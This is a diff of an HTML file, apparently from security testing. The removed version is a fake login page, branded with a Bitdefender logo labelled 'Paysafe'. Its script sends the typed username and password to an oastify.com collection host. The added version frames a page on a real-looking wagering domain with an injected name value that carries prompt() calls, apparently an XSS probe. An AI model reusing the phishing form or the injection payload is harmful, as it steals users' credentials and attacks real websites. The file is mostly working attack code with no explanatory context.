@@ -1,68 +1,11 @@
+<!doctype html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f5f5f5;
-        }
-        .login-container {
-            text-align: center;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        .login-container img {
-            width: 200px;
-            margin-bottom: 20px;
-        }
-        .login-form input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-        .login-form button {
-            width: 100%;
-            padding: 10px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-    </style>
-</head>
 <body>
-    <div class="login-container">
-        <img src="https://download.bitdefender.com/resources/themes/draco/images/lite_v2/logo.svg" alt="Paysafe Logo">
-        <form class="login-form" onsubmit="submitForm(event)">
-            <input id="username" type="text" placeholder="Username" required><br>
-            <input id="password" type="password" placeholder="Password" required><br>
-            <button type="submit">Login</button>
-        </form>
-    </div>
-
-    <script>
-        function submitForm(event) {
-            event.preventDefault(); // Prevent form submission
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var url = 'https://2gjvgnfaeo0o0g2b599991tojfp6dw1l.oastify.com/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
-            window.location.href = url; // Redirect to the URL with credentials as parameters
-        }
-    </script>
+  <iframe
+    src="https://cdn.dvc.americanwagering.com/ss.html"
+    name='ss:${prompt(555)}:prompt(444)'
+    width="800"
+    height="600">
+  </iframe>
 </body>
 </html>
-
